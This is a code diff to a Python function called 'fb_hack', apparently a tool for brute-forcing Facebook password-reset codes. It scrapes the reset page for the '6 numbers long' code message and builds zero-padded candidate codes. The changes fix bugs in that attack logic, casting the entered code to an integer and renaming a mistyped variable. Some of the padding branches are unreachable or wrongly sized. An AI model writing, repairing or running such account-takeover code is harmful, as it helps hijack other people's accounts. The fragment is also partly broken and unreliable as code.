@@ -81,7 +81,8 @@ def fb_hack():
   check4 = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   if check1 != test:
     print(check1)
-    reset = input('Code:') or 999999
+    reset1 = input('Code:') or 999999
+    reset = int(reset1)
   else:
     print(check2)
     reset = 99999999
@@ -96,19 +97,19 @@ def fb_hack():
       elif reset < 10000:
         h = ""
         code = ("0000", str(y))
-        y0 = h.join(code)
+        yo = h.join(code)
       elif reset < 1000:
         h = ""
         code = ("00000", str(y))
-        y0 = h.join(code)
+        yo = h.join(code)
       elif reset < 100:
         h = ""
         code = ("000000", str(y))
-        y0 = h.join(code)
+        yo = h.join(code)
       elif reset < 10:
         h = ""
         code = ("00000000", str(y))
-        y0 = h.join(code)
+        yo = h.join(code)
       elif reset < 0:
         reset = 999999
         yo = str(reset)
@@ -144,23 +145,23 @@ def fb_hack():
       elif reset < 100000:
         h = ""
         code = ("000", str(y))
-        y0 = h.join(code)
+        yo = h.join(code)
       elif reset < 10000:
         h = ""
         code = ("0000", str(y))
-        y0 = h.join(code)
+        yo = h.join(code)
       elif reset < 1000:
         h = ""
         code = ("00000", str(y))
-        y0 = h.join(code)
+        yo = h.join(code)
       elif reset < 100:
         h = ""
         code = ("000000", str(y))
-        y0 = h.join(code)
+        yo = h.join(code)
       elif reset < 10:
         h = ""
         code = ("00000000", str(y))
-        y0 = h.join(code)
+        yo = h.join(code)
       elif reset < 0:
         reset = 99999999
       else:
